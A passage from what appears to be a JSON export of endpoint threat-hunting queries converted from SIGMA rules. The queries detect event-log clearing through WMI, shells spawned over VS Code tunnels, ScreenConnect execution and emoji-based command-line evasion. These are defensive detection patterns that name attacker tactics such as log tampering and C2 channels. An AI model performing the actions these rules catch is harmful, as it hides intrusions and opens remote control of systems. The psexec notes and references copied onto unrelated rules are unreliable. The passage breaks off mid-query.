            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 901
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the WMI class \"Win32_NTEventlogFile\" in a potentially suspicious way (delete, backup, change permissions, etc.) from a PowerShell script",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Call To Win32_NTEventlogFile Class",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Win32_NTEventlogFile\" and (tgt.process.cmdline contains \".BackupEventlog(\" or tgt.process.cmdline contains \".ChangeSecurityPermissions(\" or tgt.process.cmdline contains \".ChangeSecurityPermissionsEx(\" or tgt.process.cmdline contains \".ClearEventLog(\" or tgt.process.cmdline contains \".Delete(\" or tgt.process.cmdline contains \".DeleteEx(\" or tgt.process.cmdline contains \".Rename(\" or tgt.process.cmdline contains \".TakeOwnerShip(\" or tgt.process.cmdline contains \".TakeOwnerShipEx(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 902
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a shell (powershell, bash, wsl...) via Visual Studio Code tunnel. Attackers can abuse this functionality to establish a C2 channel and execute arbitrary commands on the system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Visual Studio Code Tunnel Shell Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\servers\\Stable-\" and src.process.image.path contains \"\\server\\node.exe\" and src.process.cmdline contains \".vscode-server\") and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and tgt.process.cmdline contains \"\\terminal\\browser\\media\\shellIntegration.ps1\") or (tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\bash.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 903
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - ScreenConnect Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"ScreenConnect Service\" or tgt.process.displayName=\"ScreenConnect\" or tgt.process.publisher=\"ScreenConnect Software\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 904
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 3",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83e\udd86\" or tgt.process.cmdline contains \"\ud83e\udd85\" or tgt.process.cmdline contains \"\ud83e\udd89\" or tgt.process.cmdline contains \"\ud83e\udd87\" or tgt.process.cmdline contains \"\ud83d\udc3a\" or tgt.process.cmdline contains \"\ud83d\udc17\" or tgt.process.cmdline contains \"\ud83d\udc34\" or tgt.process.cmdline contains \"\ud83e\udd84\" or tgt.process.cmdline contains \"\ud83d\udc1d\" or tgt.process.cmdline contains \"\ud83e\udeb1\" or tgt.process.cmdline contains \"\ud83d\udc1b\" or tgt.process.cmdline contains \"\ud83e\udd8b\" or tgt.process.cmdline contains \"\ud83d\udc0c\" or tgt.process.cmdline contains \"\ud83d\udc1e\" or tgt.process.cmdline contains \"\ud83d\udc1c\" or tgt.process.cmdline contains \"\ud83e\udeb0\" or tgt.process.cmdline contains \"\ud83e\udeb2\" or tgt.process.cmdline contains \"\ud83e\udeb3\" or tgt.process.cmdline contains \"\ud83e\udd9f\" or tgt.process.cmdline contains \"\ud83e\udd97\" or tgt.process.cmdline contains \"\ud83d\udd77\" or tgt.process.cmdline contains \"\ud83d\udd78\" or tgt.process.cmdline contains \"\ud83e\udd82\" or tgt.process.cmdline contains \"\ud83d\udc22\" or tgt.process.cmdline contains \"\ud83d\udc0d\" or tgt.process.cmdline contains \"\ud83e\udd8e\" or tgt.process.cmdline contains \"\ud83e\udd96\" or tgt.process.cmdline contains \"\ud83e\udd95\" or tgt.process.cmdline contains \"\ud83d\udc19\" or tgt.process.cmdline contains \"\ud83e\udd91\" or tgt.process.cmdline contains \"\ud83e\udd90\" or tgt.process.cmdline contains \"\ud83e\udd9e\" or tgt.process.cmdline contains \"\ud83e\udd80\" or tgt.process.cmdline contains \"\ud83e\udeb8\" or tgt.process.cmdline contains \"\ud83d\udc21\" or tgt.process.cmdline contains \"\ud83d\udc20\" or tgt.process.cmdline contains \"\ud83d\udc1f\" or tgt.process.cmdline contains \"\ud83d\udc2c\" or tgt.process.cmdline contains \"\ud83d\udc33\" or tgt.process.cmdline contains \"\ud83d\udc0b\" or tgt.process.cmdline contains \"\ud83e\udd88\" or tgt.process.cmdline contains \"\ud83d\udc0a\" or tgt.process.cmdline contains \"\ud83d\udc05\" or tgt.process.cmdline contains \"\ud83d\udc06\" or tgt.process.cmdline contains \"\ud83e\udd93\" or tgt.process.cmdline contains \"\ud83e\udd8d\" or tgt.process.cmdline contains \"\ud83e\udda7\" or tgt.process.cmdline contains \"\ud83e\udda3\" or tgt.process.cmdline contains \"\ud83d\udc18\" or tgt.process.cmdline contains \"\ud83e\udd9b\" or tgt.process.cmdline contains \"\ud83e\udd8f\" or tgt.process.cmdline contains \"\ud83d\udc2a\" or tgt.process.cmdline contains \"\ud83d\udc2b\" or tgt.process.cmdline contains \"\ud83e\udd92\" or tgt.process.cmdline contains \"\ud83e\udd98\" or tgt.process.cmdline contains \"\ud83e\uddac\" or tgt.process.cmdline contains \"\ud83d\udc03\" or tgt.process.cmdline contains \"\ud83d\udc02\" or tgt.process.cmdline contains \"\ud83d\udc04\" or tgt.process.cmdline contains \"\ud83d\udc0e\" or tgt.process.cmdline contains \"\ud83d\udc16\" or tgt.process.cmdline contains \"\ud83d\udc0f\" or tgt.process.cmdline contains \"\ud83d\udc11\" or tgt.process.cmdline contains \"\ud83e\udd99\" or tgt.process.cmdline contains \"\ud83d\udc10\" or tgt.process.cmdline contains \"\ud83e\udd8c\" or tgt.process.cmdline contains \"\ud83d\udc15\" or tgt.process.cmdline contains \"\ud83d\udc29\" or tgt.process.cmdline contains \"\ud83e\uddae\" or tgt.process.cmdline contains \"\ud83d\udc15\u200d\ud83e\uddba\" or tgt.process.cmdline contains \"\ud83d\udc08\" or tgt.process.cmdline contains \"\ud83d\udc08\u200d\u2b1b\" or tgt.process.cmdline contains \"\ud83e\udeb6\" or tgt.process.cmdline contains \"\ud83d\udc13\" or tgt.process.cmdline contains \"\ud83e\udd83\" or tgt.process.cmdline contains \"\ud83e\udda4\" or tgt.process.cmdline contains \"\ud83e\udd9a\" or tgt.process.cmdline contains \"\ud83e\udd9c\" or tgt.process.cmdline contains \"\ud83e\udda2\" or tgt.process.cmdline contains \"\ud83e\udda9\" or tgt.process.cmdline contains \"\ud83d\udd4a\" or tgt.process.cmdline contains \"\ud83d\udc07\" or tgt.process.cmdline contains \"\ud83e\udd9d\" or tgt.process.cmdline contains \"\ud83e\udda8\" or tgt.process.cmdline contains \"\ud83e\udda1\" or tgt.process.cmdline contains \"\ud83e\uddab\" or tgt.process.cmdline contains \"\ud83e\udda6\" or tgt.process.cmdline contains \"\ud83e\udda5\" or tgt.process.cmdline contains \"\ud83d\udc01\" or tgt.process.cmdline contains \"\ud83d\udc00\" or tgt.process.cmdline contains \"\ud83d\udc3f\" or tgt.process.cmdline contains \"\ud83e\udd94\" or tgt.process.cmdline contains \"\ud83d\udc3e\" or tgt.process.cmdline contains \"\ud83d\udc09\" or tgt.process.cmdline contains \"\ud83d\udc32\" or tgt.process.cmdline contains \"\ud83c\udf35\" or tgt.process.cmdline contains \"\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf32\" or tgt.process.cmdline contains \"\ud83c\udf33\" or tgt.process.cmdline contains \"\ud83c\udf34\" or tgt.process.cmdline contains \"\ud83e\udeb9\" or tgt.process.cmdline contains \"\ud83e\udeba\" or tgt.process.cmdline contains \"\ud83e\udeb5\" or tgt.process.cmdline contains \"\ud83c\udf31\" or tgt.process.cmdline contains \"\ud83c\udf3f\" or tgt.process.cmdline contains \"\u2618\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf40\" or tgt.process.cmdline contains \"\ud83c\udf8d\" or tgt.process.cmdline contains \"\ud83e\udeb4\" or tgt.process.cmdline contains \"\ud83c\udf8b\" or tgt.process.cmdline contains \"\ud83c\udf43\" or tgt.process.cmdline contains \"\ud83c\udf42\" or tgt.process.cmdline contains \"\ud83c\udf41\" or tgt.process.cmdline contains \"\ud83c\udf44\" or tgt.process.cmdline contains \"\ud83d\udc1a\" or tgt.process.cmdline contains \"\ud83e\udea8\" or tgt.process.cmdline contains \"\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc90\" or tgt.process.cmdline contains \"\ud83c\udf37\" or tgt.process.cmdline contains \"\ud83e\udeb7\" or tgt.process.cmdline contains \"\ud83c\udf39\" or tgt.process.cmdline contains \"\ud83e\udd40\" or tgt.process.cmdline contains \"\ud83c\udf3a\" or tgt.process.cmdline contains \"\ud83c\udf38\" or tgt.process.cmdline contains \"\ud83c\udf3c\" or tgt.process.cmdline contains \"\ud83c\udf3b\" or tgt.process.cmdline contains \"\ud83c\udf1e\" or tgt.process.cmdline contains \"\ud83c\udf1d\" or tgt.process.cmdline contains \"\ud83c\udf1b\" or tgt.process.cmdline contains \"\ud83c\udf1c\" or tgt.process.cmdline contains \"\ud83c\udf1a\" or tgt.process.cmdline contains \"\ud83c\udf15\" or tgt.process.cmdline contains \"\ud83c\udf16\" or tgt.process.cmdline contains \"\ud83c\udf17\" or tgt.process.cmdline contains \"\ud83c\udf18\" or tgt.process.cmdline contains \"\ud83c\udf11\" or tgt.process.cmdline contains \"\ud83c\udf12\" or tgt.process.cmdline contains \"\ud83c\udf13\" or tgt.process.cmdline contains \"\ud83c\udf14\" or tgt.process.cmdline contains \"\ud83c\udf19\" or tgt.process.cmdline contains \"\ud83c\udf0e\" or tgt.process.cmdline contains \"\ud83c\udf0d\" or tgt.process.cmdline contains \"\ud83c\udf0f\" or tgt.process.cmdline contains \"\ud83e\ude90\" or tgt.process.cmdline contains \"\ud83d\udcab\" or tgt.process.cmdline contains \"\u2b50\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf1f\" or tgt.process.cmdline contains \"\u2728\" or tgt.process.cmdline contains \"\u26a1\ufe0f\" or tgt.process.cmdline contains \"\u2604\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udca5\" or tgt.process.cmdline contains \"\ud83d\udd25\" or tgt.process.cmdline contains \"\ud83c\udf2a\" or tgt.process.cmdline contains \"\ud83c\udf08\" or tgt.process.cmdline contains \"\u2600\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf24\" or tgt.process.cmdline contains \"\u26c5\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf25\" or tgt.process.cmdline contains \"\u2601\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf26\" or tgt.process.cmdline contains \"\ud83c\udf27\" or tgt.process.cmdline contains \"\u26c8\" or tgt.process.cmdline contains \"\ud83c\udf29\" or tgt.process.cmdline contains \"\ud83c\udf28\" or tgt.process.cmdline contains \"\u2744\ufe0f\" or tgt.process.cmdline contains \"\u2603\ufe0f\" or tgt.process.cmdline contains \"\u26c4\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf2c\" or tgt.process.cmdline contains \"\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\udca7\" or tgt.process.cmdline contains \"\ud83d\udca6\" or tgt.process.cmdline contains \"\ud83e\udee7\" or tgt.process.cmdline contains \"\u2614\ufe0f\" or tgt.process.cmdline contains \"\u2602\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf0a\" or tgt.process.cmdline contains \"\ud83c\udf2b\ud83c\udf4f\" or tgt.process.cmdline contains \"\ud83c\udf4e\" or tgt.process.cmdline contains \"\ud83c\udf50\" or tgt.process.cmdline contains \"\ud83c\udf4a\" or tgt.process.cmdline contains \"\ud83c\udf4b\" or tgt.process.cmdline contains \"\ud83c\udf4c\" or tgt.process.cmdline contains \"\ud83c\udf49\" or tgt.process.cmdline contains \"\ud83c\udf47\" or tgt.process.cmdline contains \"\ud83c\udf53\" or tgt.process.cmdline contains \"\ud83e\uded0\" or tgt.process.cmdline contains \"\ud83c\udf48\" or tgt.process.cmdline contains \"\ud83c\udf52\" or tgt.process.cmdline contains \"\ud83c\udf51\" or tgt.process.cmdline contains \"\ud83e\udd6d\" or tgt.process.cmdline contains \"\ud83c\udf4d\" or tgt.process.cmdline contains \"\ud83e\udd65\" or tgt.process.cmdline contains \"\ud83e\udd5d\" or tgt.process.cmdline contains \"\ud83c\udf45\" or tgt.process.cmdline contains \"\ud83c\udf46\" or tgt.process.cmdline contains \"\ud83e\udd51\" or tgt.process.cmdline contains \"\ud83e\udd66\" or tgt.process.cmdline contains \"\ud83e\udd6c\" or tgt.process.cmdline contains \"\ud83e\udd52\" or tgt.process.cmdline contains \"\ud83c\udf36\" or tgt.process.cmdline contains \"\ud83e\uded1\" or tgt.process.cmdline contains \"\ud83c\udf3d\" or tgt.process.cmdline contains \"\ud83e\udd55\" or tgt.process.cmdline contains \"\ud83e\uded2\" or tgt.process.cmdline contains \"\ud83e\uddc4\" or tgt.process.cmdline contains \"\ud83e\uddc5\" or tgt.process.cmdline contains \"\ud83e\udd54\" or tgt.process.cmdline contains \"\ud83c\udf60\" or tgt.process.cmdline contains \"\ud83e\uded8\" or tgt.process.cmdline contains \"\ud83e\udd50\" or tgt.process.cmdline contains \"\ud83e\udd6f\" or tgt.process.cmdline contains \"\ud83c\udf5e\" or tgt.process.cmdline contains \"\ud83e\udd56\" or tgt.process.cmdline contains \"\ud83e\udd68\" or tgt.process.cmdline contains \"\ud83e\uddc0\" or tgt.process.cmdline contains \"\ud83e\udd5a\" or tgt.process.cmdline contains \"\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddc8\" or tgt.process.cmdline contains \"\ud83e\udd5e\" or tgt.process.cmdline contains \"\ud83e\uddc7\" or tgt.process.cmdline contains \"\ud83e\udd53\" or tgt.process.cmdline contains \"\ud83e\udd69\" or tgt.process.cmdline contains \"\ud83c\udf57\" or tgt.process.cmdline contains \"\ud83c\udf56\" or tgt.process.cmdline contains \"\ud83e\uddb4\" or tgt.process.cmdline contains \"\ud83c\udf2d\" or tgt.process.cmdline contains \"\ud83c\udf54\" or tgt.process.cmdline contains \"\ud83c\udf5f\" or tgt.process.cmdline contains \"\ud83c\udf55\" or tgt.process.cmdline contains \"\ud83e\uded3\" or tgt.process.cmdline contains \"\ud83e\udd6a\" or tgt.process.cmdline contains \"\ud83e\udd59\" or tgt.process.cmdline contains \"\ud83e\uddc6\" or tgt.process.cmdline contains \"\ud83c\udf2e\" or tgt.process.cmdline contains \"\ud83c\udf2f\" or tgt.process.cmdline contains \"\ud83e\uded4\" or tgt.process.cmdline contains \"\ud83e\udd57\" or tgt.process.cmdline contains \"\ud83e\udd58\" or tgt.process.cmdline contains \"\ud83e\uded5\" or tgt.process.cmdline contains \"\ud83e\udd6b\" or tgt.process.cmdline contains \"\ud83c\udf5d\" or tgt.process.cmdline contains \"\ud83c\udf5c\" or tgt.process.cmdline contains \"\ud83c\udf72\" or tgt.process.cmdline contains \"\ud83c\udf5b\" or tgt.process.cmdline contains \"\ud83c\udf63\" or tgt.process.cmdline contains \"\ud83c\udf71\" or tgt.process.cmdline contains \"\ud83e\udd5f\" or tgt.process.cmdline contains \"\ud83e\uddaa\" or tgt.process.cmdline contains \"\ud83c\udf64\" or tgt.process.cmdline contains \"\ud83c\udf59\" or tgt.process.cmdline contains \"\ud83c\udf5a\" or tgt.process.cmdline contains \"\ud83c\udf58\" or tgt.process.cmdline contains \"\ud83c\udf65\" or tgt.process.cmdline contains \"\ud83e\udd60\" or tgt.process.cmdline contains \"\ud83e\udd6e\" or tgt.process.cmdline contains \"\ud83c\udf62\" or tgt.process.cmdline contains \"\ud83c\udf61\" or tgt.process.cmdline contains \"\ud83c\udf67\" or tgt.process.cmdline contains \"\ud83c\udf68\" or tgt.process.cmdline contains \"\ud83c\udf66\" or tgt.process.cmdline contains \"\ud83e\udd67\" or tgt.process.cmdline contains \"\ud83e\uddc1\" or tgt.process.cmdline contains \"\ud83c\udf70\" or tgt.process.cmdline contains \"\ud83c\udf82\" or tgt.process.cmdline contains \"\ud83c\udf6e\" or tgt.process.cmdline contains \"\ud83c\udf6d\" or tgt.process.cmdline contains \"\ud83c\udf6c\" or tgt.process.cmdline contains \"\ud83c\udf6b\" or tgt.process.cmdline contains \"\ud83c\udf7f\" or tgt.process.cmdline contains \"\ud83c\udf69\" or tgt.process.cmdline contains \"\ud83c\udf6a\" or tgt.process.cmdline contains \"\ud83c\udf30\" or tgt.process.cmdline contains \"\ud83e\udd5c\" or tgt.process.cmdline contains \"\ud83c\udf6f\" or tgt.process.cmdline contains \"\ud83e\udd5b\" or tgt.process.cmdline contains \"\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uded6\" or tgt.process.cmdline contains \"\u2615\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf75\" or tgt.process.cmdline contains \"\ud83e\uddc3\" or tgt.process.cmdline contains \"\ud83e\udd64\" or tgt.process.cmdline contains \"\ud83e\uddcb\" or tgt.process.cmdline contains \"\ud83e\uded9\" or tgt.process.cmdline contains \"\ud83c\udf76\" or tgt.process.cmdline contains \"\ud83c\udf7a\" or tgt.process.cmdline contains \"\ud83c\udf7b\" or tgt.process.cmdline contains \"\ud83e\udd42\" or tgt.process.cmdline contains \"\ud83c\udf77\" or tgt.process.cmdline contains \"\ud83e\uded7\" or tgt.process.cmdline contains \"\ud83e\udd43\" or tgt.process.cmdline contains \"\ud83c\udf78\" or tgt.process.cmdline contains \"\ud83c\udf79\" or tgt.process.cmdline contains \"\ud83e\uddc9\" or tgt.process.cmdline contains \"\ud83c\udf7e\" or tgt.process.cmdline contains \"\ud83e\uddca\" or tgt.process.cmdline contains \"\ud83e\udd44\" or tgt.process.cmdline contains \"\ud83c\udf74\" or tgt.process.cmdline contains \"\ud83c\udf7d\" or tgt.process.cmdline contains \"\ud83e\udd63\" or tgt.process.cmdline contains \"\ud83e\udd61\" or tgt.process.cmdline contains \"\ud83e\udd62\" or tgt.process.cmdline contains \"\ud83e\uddc2\" or tgt.process.cmdline contains \"\u26bd\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc0\" or tgt.process.cmdline contains \"\ud83c\udfc8\" or tgt.process.cmdline contains \"\u26be\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd4e\" or tgt.process.cmdline contains \"\ud83c\udfbe\" or tgt.process.cmdline contains \"\ud83c\udfd0\" or tgt.process.cmdline contains \"\ud83c\udfc9\" or tgt.process.cmdline contains \"\ud83e\udd4f\" or tgt.process.cmdline contains \"\ud83c\udfb1\" or tgt.process.cmdline contains \"\ud83e\ude80\" or tgt.process.cmdline contains \"\ud83c\udfd3\" or tgt.process.cmdline contains \"\ud83c\udff8\" or tgt.process.cmdline contains \"\ud83c\udfd2\" or tgt.process.cmdline contains \"\ud83c\udfd1\" or tgt.process.cmdline contains \"\ud83e\udd4d\" or tgt.process.cmdline contains \"\ud83c\udfcf\" or tgt.process.cmdline contains \"\ud83e\ude83\" or tgt.process.cmdline contains \"\ud83e\udd45\" or tgt.process.cmdline contains \"\u26f3\ufe0f\" or tgt.process.cmdline contains \"\ud83e\ude81\" or tgt.process.cmdline contains \"\ud83c\udff9\" or tgt.process.cmdline contains \"\ud83c\udfa3\" or tgt.process.cmdline contains \"\ud83e\udd3f\" or tgt.process.cmdline contains \"\ud83e\udd4a\" or tgt.process.cmdline contains \"\ud83e\udd4b\" or tgt.process.cmdline contains \"\ud83c\udfbd\" or tgt.process.cmdline contains \"\ud83d\udef9\" or tgt.process.cmdline contains \"\ud83d\udefc\" or tgt.process.cmdline contains \"\ud83d\udef7\" or tgt.process.cmdline contains \"\u26f8\" or tgt.process.cmdline contains \"\ud83e\udd4c\" or tgt.process.cmdline contains \"\ud83c\udfbf\" or tgt.process.cmdline contains \"\u26f7\" or tgt.process.cmdline contains \"\ud83c\udfc2\" or tgt.process.cmdline contains \"\ud83e\ude82\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3c\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3c\" or tgt.process.cmdline contains \"\ud83e\udd3c\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\" or tgt.process.cmdline contains \"\ud83e\udd38\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3a\" or tgt.process.cmdline contains \"\ud83e\udd3e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\" or tgt.process.cmdline contains \"\ud83e\udd3e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\" or tgt.process.cmdline contains \"\ud83e\uddd8\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\" or tgt.process.cmdline contains \"\ud83e\uddd8\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\" or tgt.process.cmdline contains \"\ud83c\udfc4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\" or tgt.process.cmdline contains \"\ud83c\udfca\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\" or tgt.process.cmdline contains \"\ud83e\udd3d\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\" or tgt.process.cmdline contains \"\ud83d\udea3\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\" or tgt.process.cmdline contains \"\ud83e\uddd7\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\" or tgt.process.cmdline contains \"\ud83d\udeb5\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\" or tgt.process.cmdline contains \"\ud83d\udeb4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc6\" or tgt.process.cmdline contains \"\ud83e\udd47\" or tgt.process.cmdline contains \"\ud83e\udd48\" or tgt.process.cmdline contains \"\ud83e\udd49\" or tgt.process.cmdline contains \"\ud83c\udfc5\" or tgt.process.cmdline contains \"\ud83c\udf96\" or tgt.process.cmdline contains \"\ud83c\udff5\" or tgt.process.cmdline contains \"\ud83c\udf97\" or tgt.process.cmdline contains \"\ud83c\udfab\" or tgt.process.cmdline contains \"\ud83c\udf9f\" or tgt.process.cmdline contains \"\ud83c\udfaa\" or tgt.process.cmdline contains \"\ud83e\udd39\" or tgt.process.cmdline contains \"\ud83e\udd39\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfad\" or tgt.process.cmdline contains \"\ud83e\ude70\" or tgt.process.cmdline contains \"\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83c\udfac\" or tgt.process.cmdline contains \"\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83c\udfa7\" or tgt.process.cmdline contains \"\ud83c\udfbc\" or tgt.process.cmdline contains \"\ud83c\udfb9\" or tgt.process.cmdline contains \"\ud83e\udd41\" or tgt.process.cmdline contains \"\ud83e\ude98\" or tgt.process.cmdline contains \"\ud83c\udfb7\" or tgt.process.cmdline contains \"\ud83c\udfba\" or tgt.process.cmdline contains \"\ud83e\ude97\" or tgt.process.cmdline contains \"\ud83c\udfb8\" or tgt.process.cmdline contains \"\ud83e\ude95\" or tgt.process.cmdline contains \"\ud83c\udfbb\" or tgt.process.cmdline contains \"\ud83c\udfb2\" or tgt.process.cmdline contains \"\u265f\" or tgt.process.cmdline contains \"\ud83c\udfaf\" or 